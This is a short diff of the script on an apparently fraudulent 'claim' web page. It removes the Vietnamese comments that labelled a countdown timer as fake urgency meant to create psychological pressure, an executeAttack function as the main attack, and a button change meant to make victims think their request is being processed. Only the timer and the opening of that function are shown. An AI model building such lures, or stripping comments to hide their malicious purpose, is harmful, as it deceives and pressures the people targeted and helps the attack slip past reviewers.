@@ -94,8 +94,7 @@
     </div>
 
     <script>
-        // Tạo đồng hồ đếm ngược để gây áp lực tâm lý (Fake Urgency)
-        let time = 300; // 5 phút
+        let time = 300; 
         setInterval(() => {
             const minutes = Math.floor(time / 60);
             let seconds = time % 60;
@@ -104,9 +103,7 @@
             time--;
         }, 1000);
 
-        // HÀM TẤN CÔNG CHÍNH
         function executeAttack() {
-            // Thay đổi giao diện nút để người dùng tưởng đang xử lý
             const btn = document.querySelector('.btn-claim');
             btn.innerHTML = "Đang xử lý...";
             btn.style.backgroundColor = "#ccc";
